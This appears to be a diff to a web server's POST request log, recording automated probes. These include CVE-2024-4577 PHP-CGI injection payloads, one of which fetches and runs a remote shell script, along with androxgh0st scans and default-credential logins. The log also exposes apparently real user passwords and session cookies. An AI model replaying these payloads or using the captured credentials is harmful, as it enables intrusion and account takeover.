@@ -1,1 +1,95 @@
 {"timestamp":1745455634,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745460400,"HOST":"20.64.239.122","REQUEST_URI":"\/php-cgi\/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D\"\"+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp:\/\/input","requestType":"POST","query":{"<?php_$env":{"\"USERNAME\"":" @get_current_user(); $env[\"HOSTNAME\"] = @gethostname(); $env['USERNAME_SIGN'] = @md5($env[\"USERNAME\"]); echo @json_encode($env); @die(); ?>"}},"cookie":[]}
+{"timestamp":1745461455,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/index.php","requestType":"POST","query":{"csrfp_token":"false","frmuser":"admin","frmpass":"Conv3rg3nt","login":"Enter"},"cookie":{"PHPSESSID":"af09c866bb5e4bf526a7f8cc9206e630","_gid":"GA1.2.1014459596.1745442246","_ga":"GA1.1.563923479.1745442246","_ga_VQ5893D11N":"GS1.1.1745442246.1.0.1745442255.51.0.0"}}
+{"timestamp":1745461458,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/index.php","requestType":"POST","query":{"csrfp_token":"false","frmuser":"admin","frmpass":"Conv3rg3nt","login":"Enter"},"cookie":{"PHPSESSID":"af09c866bb5e4bf526a7f8cc9206e630","_gid":"GA1.2.1014459596.1745442246","_ga":"GA1.1.563923479.1745442246","_ga_VQ5893D11N":"GS1.1.1745442246.1.0.1745442255.51.0.0","csrfp_token":"305372ab3a"}}
+{"timestamp":1745463760,"HOST":"20.64.239.122","REQUEST_URI":"\/php-cgi\/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D\"\"+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp:\/\/input","requestType":"POST","query":{"<?php_$env":{"\"USERNAME\"":" @get_current_user(); $env[\"HOSTNAME\"] = @gethostname(); $env['USERNAME_SIGN'] = @md5($env[\"USERNAME\"]); echo @json_encode($env); @die(); ?>"}},"cookie":[]}
+{"timestamp":1745464980,"HOST":"20.64.239.122","REQUEST_URI":"\/wsman","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745464980,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/wsman","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745465710,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745465770,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/minio\/bootstrap\/v1\/verify","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745465770,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/minio\/bootstrap\/v1\/verify","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745465771,"HOST":"20.64.239.122","REQUEST_URI":"\/minio\/bootstrap\/v1\/verify","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745465772,"HOST":"20.64.239.122","REQUEST_URI":"\/wsman","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745465777,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/wsman","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745465777,"HOST":"20.64.239.122","REQUEST_URI":"\/wsman","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745465778,"HOST":"20.64.239.122","REQUEST_URI":"\/minio\/bootstrap\/v1\/verify","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745465779,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/wsman","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745466201,"HOST":"20.64.239.122","REQUEST_URI":"\/wsman","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745466379,"HOST":"20.64.239.122","REQUEST_URI":"\/wsman","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745466403,"HOST":"20.64.239.122","REQUEST_URI":"\/minio\/bootstrap\/v1\/verify","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745466404,"HOST":"20.64.239.122","REQUEST_URI":"\/wsman","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745466414,"HOST":"20.64.239.122","REQUEST_URI":"\/minio\/bootstrap\/v1\/verify","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745478463,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745495009,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745516938,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745521634,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745541372,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745567486,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745583817,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745592311,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745594353,"HOST":"20.64.239.122:443","REQUEST_URI":"\/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp:\/\/input","requestType":"POST","query":{"<?php_shell_exec(base64_decode(\"WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA":"\")); echo(md5(\"Hello CVE-2024-4577\")); ?>"},"cookie":[]}
+{"timestamp":1745600385,"HOST":"20.64.239.122:443","REQUEST_URI":"\/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp:\/\/input","requestType":"POST","query":{"<?php_shell_exec(base64_decode(\"WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA":"\")); echo(md5(\"Hello CVE-2024-4577\")); ?>"},"cookie":[]}
+{"timestamp":1745604160,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745613619,"HOST":"20.64.239.122","REQUEST_URI":"\/php-cgi\/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D\"\"+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp:\/\/input","requestType":"POST","query":{"<?php_$env":{"\"USERNAME\"":" @get_current_user(); $env[\"HOSTNAME\"] = @gethostname(); $env['USERNAME_SIGN'] = @md5($env[\"USERNAME\"]); echo @json_encode($env); @die(); ?>"}},"cookie":[]}
+{"timestamp":1745616165,"HOST":"20.64.239.122","REQUEST_URI":"\/php-cgi\/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D\"\"+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp:\/\/input","requestType":"POST","query":{"<?php_$env":{"\"USERNAME\"":" @get_current_user(); $env[\"HOSTNAME\"] = @gethostname(); $env['USERNAME_SIGN'] = @md5($env[\"USERNAME\"]); echo @json_encode($env); @die(); ?>"}},"cookie":[]}
+{"timestamp":1745664387,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745669467,"HOST":"20.64.239.122","REQUEST_URI":"\/wsman","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745675734,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745685231,"HOST":"20.64.239.122","REQUEST_URI":"\/sdk","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745685235,"HOST":"20.64.239.122:443","REQUEST_URI":"\/","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745695079,"HOST":"20.64.239.122:443","REQUEST_URI":"\/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp:\/\/input","requestType":"POST","query":{"<?php_shell_exec(base64_decode(\"WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA":"\")); echo(md5(\"Hello CVE-2024-4577\")); ?>"},"cookie":[]}
+{"timestamp":1745703939,"HOST":"20.64.239.122:443","REQUEST_URI":"\/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp:\/\/input","requestType":"POST","query":{"<?php_shell_exec(base64_decode(\"WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA":"\")); echo(md5(\"Hello CVE-2024-4577\")); ?>"},"cookie":[]}
+{"timestamp":1745704574,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745709445,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745717925,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745718119,"HOST":"20.64.239.122:443","REQUEST_URI":"\/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp:\/\/input","requestType":"POST","query":{"<?php_shell_exec(base64_decode(\"WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA":"\")); echo(md5(\"Hello CVE-2024-4577\")); ?>"},"cookie":[]}
+{"timestamp":1745732532,"HOST":"20.64.239.122:443","REQUEST_URI":"\/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp:\/\/input","requestType":"POST","query":{"<?php_shell_exec(base64_decode(\"WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA":"\")); echo(md5(\"Hello CVE-2024-4577\")); ?>"},"cookie":[]}
+{"timestamp":1745733155,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745742676,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"{\"id\":_1,_\"method\":_\"getwork\",_\"params\":_":[""]},"cookie":[]}
+{"timestamp":1745742677,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"{\"id\":_1,_\"method\":_\"eth_getWork\",_\"params\":_":[""]},"cookie":[]}
+{"timestamp":1745745635,"HOST":"20.64.239.122","REQUEST_URI":"\/remote\/logincheck","requestType":"POST","query":{"ajax":"1","username":"admin","credential":"admin"},"cookie":[]}
+{"timestamp":1745746188,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745764482,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745772698,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745787877,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745789617,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/aura","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745789620,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/s\/sfsites\/aura","requestType":"POST","query":[],"cookie":{"PHPSESSID":"543f510544429da0b2e724ab1f139e23"}}
+{"timestamp":1745789627,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/sfsites\/aura","requestType":"POST","query":[],"cookie":{"PHPSESSID":"543f510544429da0b2e724ab1f139e23"}}
+{"timestamp":1745789631,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/s\/aura","requestType":"POST","query":[],"cookie":{"PHPSESSID":"543f510544429da0b2e724ab1f139e23"}}
+{"timestamp":1745789633,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/s\/fact","requestType":"POST","query":[],"cookie":{"PHPSESSID":"543f510544429da0b2e724ab1f139e23"}}
+{"timestamp":1745789925,"HOST":"20.64.239.122","REQUEST_URI":"\/php-cgi\/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D\"\"+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp:\/\/input","requestType":"POST","query":{"<?php_$env":{"\"USERNAME\"":" @get_current_user(); $env[\"HOSTNAME\"] = @gethostname(); $env['USERNAME_SIGN'] = @md5($env[\"USERNAME\"]); echo @json_encode($env); @die(); ?>"}},"cookie":[]}
+{"timestamp":1745791525,"HOST":"20.64.239.122","REQUEST_URI":"\/php-cgi\/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D\"\"+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp:\/\/input","requestType":"POST","query":{"<?php_$env":{"\"USERNAME\"":" @get_current_user(); $env[\"HOSTNAME\"] = @gethostname(); $env['USERNAME_SIGN'] = @md5($env[\"USERNAME\"]); echo @json_encode($env); @die(); ?>"}},"cookie":[]}
+{"timestamp":1745792076,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"{\"id\":_1,_\"method\":_\"getwork\",_\"params\":_":[""]},"cookie":[]}
+{"timestamp":1745792080,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"{\"id\":_1,_\"method\":_\"eth_getWork\",_\"params\":_":[""]},"cookie":[]}
+{"timestamp":1745800670,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745820115,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745827781,"HOST":"20.64.239.122:443","REQUEST_URI":"\/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp:\/\/input","requestType":"POST","query":{"<?php_shell_exec(base64_decode(\"WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA":"\")); echo(md5(\"Hello CVE-2024-4577\")); ?>"},"cookie":[]}
+{"timestamp":1745833198,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745847505,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745851810,"HOST":"20.64.239.122:443","REQUEST_URI":"\/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp:\/\/input","requestType":"POST","query":{"<?php_shell_exec(base64_decode(\"WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA":"\")); echo(md5(\"Hello CVE-2024-4577\")); ?>"},"cookie":[]}
+{"timestamp":1745858179,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745862270,"HOST":"docuworks.avidian.com","REQUEST_URI":"\/\/index.php","requestType":"POST","query":{"csrfp_token":"false","frmuser":"donnae","frmpass":"4LbF6vB!","login":"Enter"},"cookie":{"PHPSESSID":"34dc13adb7b9ebb83bd992ac7765ffd2","_gid":"GA1.2.1759618841.1745857945","_ga_VQ5893D11N":"GS1.1.1745857945.350.1.1745860778.59.0.0","_ga":"GA1.2.252331523.1727373656"}}
+{"timestamp":1745875861,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745887569,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745890155,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745896565,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745899534,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745899945,"HOST":"20.64.239.122","REQUEST_URI":"\/sdk","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745899948,"HOST":"20.64.239.122:443","REQUEST_URI":"\/","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745914793,"HOST":"20.64.239.122:443","REQUEST_URI":"\/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp:\/\/input","requestType":"POST","query":{"<?php_shell_exec(base64_decode(\"WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA":"\")); echo(md5(\"Hello CVE-2024-4577\")); ?>"},"cookie":[]}
+{"timestamp":1745923717,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745955152,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":{"0x":["androxgh0st"]},"cookie":[]}
+{"timestamp":1745961603,"HOST":"20.64.239.122","REQUEST_URI":"\/php-cgi\/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D\"\"+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp:\/\/input","requestType":"POST","query":{"<?php_$env":{"\"USERNAME\"":" @get_current_user(); $env[\"HOSTNAME\"] = @gethostname(); $env['USERNAME_SIGN'] = @md5($env[\"USERNAME\"]); echo @json_encode($env); @die(); ?>"}},"cookie":[]}
+{"timestamp":1745963063,"HOST":"20.64.239.122","REQUEST_URI":"\/php-cgi\/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+disable_functions%3D\"\"+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp:\/\/input","requestType":"POST","query":{"<?php_$env":{"\"USERNAME\"":" @get_current_user(); $env[\"HOSTNAME\"] = @gethostname(); $env['USERNAME_SIGN'] = @md5($env[\"USERNAME\"]); echo @json_encode($env); @die(); ?>"}},"cookie":[]}
+{"timestamp":1745975012,"HOST":"20.64.239.122","REQUEST_URI":"\/dns-query","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745975012,"HOST":"20.64.239.122","REQUEST_URI":"\/dns-query","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745975013,"HOST":"20.64.239.122","REQUEST_URI":"\/query","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745975013,"HOST":"20.64.239.122","REQUEST_URI":"\/query","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745975013,"HOST":"20.64.239.122","REQUEST_URI":"\/resolve","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745975013,"HOST":"20.64.239.122","REQUEST_URI":"\/resolve","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745975013,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745975014,"HOST":"20.64.239.122","REQUEST_URI":"\/","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745982968,"HOST":"20.64.239.122","REQUEST_URI":"\/portal","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1745983718,"HOST":"20.64.239.122:443","REQUEST_URI":"\/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp:\/\/input","requestType":"POST","query":{"<?php_shell_exec(base64_decode(\"WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA":"\")); echo(md5(\"Hello CVE-2024-4577\")); ?>"},"cookie":[]}
+{"timestamp":1746015846,"HOST":"192.168.0.1:443","REQUEST_URI":"\/GponForm\/diag_Form?style\/","requestType":"POST","query":[],"cookie":[]}
+{"timestamp":1746057105,"HOST":"20.64.239.122:443","REQUEST_URI":"\/hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp:\/\/input","requestType":"POST","query":{"<?php_shell_exec(base64_decode(\"WD0kKGN1cmwgaHR0cDovLzEwNy4xNTAuMC4xMDMvc2ggfHwgd2dldCBodHRwOi8vMTA3LjE1MC4wLjEwMy9zaCAtTy0pOyBlY2hvICIkWCIgfCBzaCAtcyBjdmVfMjAyNF80NTc3LnNlbGZyZXA":"\")); echo(md5(\"Hello CVE-2024-4577\")); ?>"},"cookie":[]}
